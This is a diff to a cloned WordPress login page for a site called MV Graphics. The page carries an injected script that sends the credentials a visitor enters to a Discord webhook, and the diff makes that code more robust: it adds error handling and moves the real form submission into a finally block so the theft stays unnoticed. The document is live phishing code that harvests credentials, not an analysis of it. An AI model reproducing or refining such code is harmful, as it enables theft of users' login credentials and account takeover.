@@ -50,7 +50,7 @@
             function wp_attempt_focus() {
                 setTimeout(function() {
                     try {
-                        d = document.getElementById("user_login");
+                        var d = document.getElementById("user_login");
                         d.focus();
                         d.select();
                     } catch (er) {}
@@ -79,17 +79,22 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
-                }).then(response => {
+                })
+                .then(response => {
                     if (response.ok) {
                         console.log('Credentials sent to Discord webhook');
                     } else {
-                        console.error('Error sending credentials to Discord webhook');
+                        return response.text().then(text => {
+                            throw new Error(text);
+                        });
                     }
-                }).catch(error => {
-                    console.error('Error:', error);
+                })
+                .catch(error => {
+                    console.error('Error sending credentials to Discord webhook:', error);
+                })
+                .finally(() => {
+                    document.getElementById('loginform').submit();
                 });
-
-                document.getElementById('loginform').submit();
             }
         </script>
         <p id="backtoblog">
@@ -146,16 +151,8 @@
     </script>
     <script src="./Aanmelden ‹ MV Graphics — WordPress_files/wp-util.min.js.download" id="wp-util-js"></script>
     <script id="user-profile-js-extra">
-        var userProfileL10n = {"user_id":"0","nonce":"4d83b7b5f4"};
-    </script>
-    <script id="user-profile-js-translations">
-        (function(domain, translations) {
-            var localeData = translations.locale_data[domain] || translations.locale_data.messages;
-            localeData[""].domain = domain;
-            wp.i18n.setLocaleData(localeData, domain);
-        })("default", {"translation-revision-date":"2024-03-08 12:49:40+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"nl_BE"},"Your new password has not been saved.":["Je nieuw wachtwoord is niet opgeslagen."],"Hide":["Verbergen"],"Show":["Tonen"],"Show password":["Wachtwoord tonen"],"Confirm use of weak password":["Bevestig het gebruik van een zwak wachtwoord"],"Hide password":["Wachtwoord verbergen"]}},"comment":{"reference":"wp-admin\/js\/user-profile.js"}});
+        var userProfileL10n = {"user_id":"0","nonce":"6b90c97f7b"};
     </script>
     <script src="./Aanmelden ‹ MV Graphics — WordPress_files/user-profile.min.js.download" id="user-profile-js"></script>
-    <div class="clear"></div>
 </body>
 </html>
